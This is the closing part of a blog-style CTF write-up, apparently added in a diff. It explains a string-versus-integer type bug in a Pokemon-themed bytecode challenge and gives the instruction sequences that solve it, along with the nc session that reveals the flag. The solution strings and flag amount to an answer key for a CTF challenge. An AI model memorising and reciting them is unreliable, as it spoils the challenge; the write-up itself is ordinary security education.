+			<span class="nb">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+		<span class="k">print</span> <span class="s">"[+] Saving %s to box %d"</span> <span class="o">%</span> <span class="p">(</span><span class="n">a</span><span class="p">.</span><span class="n">boxes</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mi">0</span><span class="p">],</span> <span class="n">status</span><span class="p">.</span><span class="n">regs</span><span class="p">[</span><span class="s">"NB"</span><span class="p">])</span>
+		<span class="n">a</span><span class="p">.</span><span class="n">move</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">status</span><span class="p">.</span><span class="n">regs</span><span class="p">[</span><span class="s">"NB"</span><span class="p">])</span>
+
+
+
+<span class="k">print</span> <span class="n">status</span><span class="p">.</span><span class="n">regs</span>
+
+<span class="k">print</span> <span class="s">"Instructions: "</span>
+<span class="n">instructions</span> <span class="o">=</span> <span class="nb">raw_input</span><span class="p">()</span>
+<span class="k">print</span> <span class="s">"</span><span class="se">\n\n</span><span class="s">Executing...</span><span class="se">\n</span><span class="s">========================"</span>
+<span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">instructions</span><span class="p">:</span>
+	<span class="k">if</span> <span class="n">status</span><span class="p">.</span><span class="n">regs</span><span class="p">[</span><span class="s">"SP"</span><span class="p">]</span> <span class="o">&gt;=</span> <span class="nb">len</span><span class="p">(</span><span class="n">a</span><span class="p">.</span><span class="n">boxes</span><span class="p">[</span><span class="n">status</span><span class="p">.</span><span class="n">regs</span><span class="p">[</span><span class="s">"NB"</span><span class="p">]])</span> <span class="ow">or</span>  <span class="n">a</span><span class="p">.</span><span class="n">boxes</span><span class="p">[</span><span class="n">status</span><span class="p">.</span><span class="n">regs</span><span class="p">[</span><span class="s">"NB"</span><span class="p">]][</span><span class="n">status</span><span class="p">.</span><span class="n">regs</span><span class="p">[</span><span class="s">"SP"</span><span class="p">]]</span> <span class="o">==</span> <span class="s">"mew"</span><span class="p">:</span>
+			<span class="n">status</span><span class="p">.</span><span class="n">regs</span><span class="p">[</span><span class="s">"LP"</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span>
+	<span class="c1">#print str(status.regs["PC"]) + " - " + x
+</span>	<span class="n">status</span><span class="p">.</span><span class="n">regs</span><span class="p">[</span><span class="s">"PC"</span><span class="p">]</span> <span class="o">=</span> <span class="n">status</span><span class="p">.</span><span class="n">regs</span><span class="p">[</span><span class="s">"PC"</span><span class="p">]</span> <span class="o">+</span> <span class="mi">1</span>
+	<span class="n">parser</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
+	<span class="k">if</span> <span class="s">"mew"</span> <span class="ow">in</span> <span class="n">a</span><span class="p">.</span><span class="n">boxes</span><span class="p">[</span><span class="mi">0</span><span class="p">]:</span>
+		<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">"flag.txt"</span><span class="p">,</span> <span class="s">"r"</span><span class="p">)</span> <span class="k">as</span> <span class="nb">file</span><span class="p">:</span>
+			<span class="n">flag</span> <span class="o">=</span> <span class="nb">file</span><span class="p">.</span><span class="n">read</span><span class="p">()</span>
+			<span class="k">print</span> <span class="n">flag</span>
+
+</code></pre></div></div>
+<p>        
+So we have a script with a small set of instructions and registers (à la bytecode) that let us operate with our pokemon team and with the boxes. Our goal is to take mew from the boxes to the team (box 0). The instruction set is:</p>
+<ul>
+  <li><strong>p</strong>: Print info</li>
+  <li><strong>s</strong>: Increment the NB register (that control the box where the action will be performed) by 1, if the final is reached it becomes 0.</li>
+  <li><strong>c</strong>: Create a new box and the cursor register (SP) is changed to 0, saving its previous value in the LP register</li>
+  <li><strong>e</strong>: Deletes the last box</li>
+  <li><strong>*</strong>: Increment SP in one</li>
+  <li><strong>/</strong>: Decrement SP in one</li>
+  <li><strong>t</strong>: Take a pokemon from the position 0 from the current box (NB value) and move it to the team</li>
+  <li><strong>d</strong>: Take the pokemon form the position 0 from the team to the current box (NB value)</li>
+</ul>
+
+<p>        
+Every time a instruction will be executed the script check the value of the auxiliary register “LP” in order to know if any conditions was violated. LP is set to 1 here:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>if status.regs["SP"] &gt;= len(a.boxes[status.regs["NB"]]) or  a.boxes[status.regs["NB"]][status.regs["SP"]] == "mew":
+			status.regs["LP"] = 1
+</code></pre></div></div>
+<p>        
+So LP will be 1 if SP register has a value equal or major than the box size or if SP points to mew.</p>
+
+<p>        
+They key point to solve this challenge is to observe the main bug: in the instructions “s” and “e” the LP check is done against “1” (string) instead of 1 (integer). So it will by bypassed <strong>:)</strong>. The challenge can be solved in differente ways. If you check the code and see the <strong>e</strong> instructions you can see a way to manipulate the LP register:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	if (status.regs["NB"] + 1) % (len(a.boxes)) == 0:
+			status.regs["SP"] = status.regs["LP"]
+			status.regs["LP"] = 0
+			status.regs["NB"] = status.regs["NB"] - 1
+</code></pre></div></div>
+<p>        
+So if the box to be destroyed is the same where the NB is pointing, LP will be 0 and NB will decrement in 1. So, we can point SP to mew (LP = 1), then use <strong>s</strong> to se NB as the last box and delete it (LP = 0) and then work with our mew. With  <code class="language-plaintext highlighter-rouge">csssddddddsstttttttsddddsssttdtss</code> we can have mew in the position 0  (LP = 1) and NB has the last box (NB = 2). If we delete (<strong>e</strong>) the last box, LP turns to 0.</p>
+
+<p>        
+The value of NB is 2, but our mew is at box 1, so we need to execute two <strong>s</strong> to put NB pointing to the correct box. But when we perform those <strong>s</strong>, the LP value will turn 1 again, so we need to use <strong>e</strong> again to delete a box (LP = 0). Now we can use <strong>t</strong> to move the mew to our team. Easy peasy! <strong>:)</strong></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[X-C3LL@Kumonga] -&gt; / ⌚  12:52:28
+$ nc challenges.ka0labs.org 5000
+{'PC': 0, 'NB': 0, 'SP': 0, 'LP': 0}
+Instructions:
+csssddddddsstttttttsddddsssttdtssesset
+
+
+Executing...
+========================
+[+] New box created
+[+] Moving to box 1
+[+] Moving to box 2
+[+] Moving to box 3
+[+] Saving pikachu to box 3
+[+] Saving charmander to box 3
+[+] Saving squirting to box 3
+[+] Saving ekans to box 3
+[+] Saving lapras to box 3
+[+] Saving dratini to box 3
+[+] Moving to box 0
+[+] Moving to box 1
+[+] Adding bulbasaur to team
+[+] Adding wartortle to team
+[+] Adding raichu to team
+[+] Adding raticate to team
+[+] Adding charizard to team
+[+] Adding ivysaur to team
+[+] Adding scyther to team
+[+] Moving to box 2
+[+] Saving omastar to box 2
+[+] Saving bulbasaur to box 2
+[+] Saving wartortle to box 2
+[+] Saving raichu to box 2
+[+] Moving to box 3
+[+] Moving to box 0
+[+] Moving to box 1
+[+] Adding golem to team
+[+] Adding pinsir to team
+[+] Saving raticate to box 1
+[+] Adding golbat to team
+[+] Moving to box 2
+[+] Moving to box 3
+[+] Box destroyed. Pokemons released:
+     magikarp
+     pikachu
+     charmander
+     squirting
+     ekans
+     lapras
+     dratini
+[+] Moving to box 0
+[+] Moving to box 1
+[+] Box destroyed. Pokemons released:
+     magikarp
+     seal
+     slowpoke
+     omastar
+     bulbasaur
+     wartortle
+     raichu
+[+] Adding mew to team
+
+
+
+==============================
+You win! nn8ed{s33_my_N3W_m3W}
+==============================
+</code></pre></div></div>
+<p>        
+An alternative way (and easier) is <code class="language-plaintext highlighter-rouge">ssddddddsstttttttdddddddtts**sstt</code>.</p>
+
+<h2 id="conclusion">Conclusion</h2>
+
+<p>        
+This year the CTF was won by <a href="https://twitter.com/roman_soft">RomanSoft</a> (probably one of the best CTF players I ever met). The challenges will be online few weeks more, so you can play it! <a href="https://nn8ed.ka0labs.org/challenges">nn8ed CTF</a> (13 challenges).</p>
+
+<p>        
+Feel free to ping me at my twitter (<a href="https://twitter.com/THEXC3LL">@TheXC3LL</a>)</p>
+
+<p>Byt3z!</p>
+
+
+
+
+      </section>
+      <footer>
+        
+        <p>This project is maintained by <a href="https://github.com/pages-themes">pages-themes</a></p>
+        
+        <p><small>Hosted on GitHub Pages &mdash; Theme by <a href="https://github.com/orderedlist">orderedlist</a></small></p>
+      </footer>
+    </div>
+    <script src="/assets/js/scale.fix.js"></script>
+  </body>
+</html>
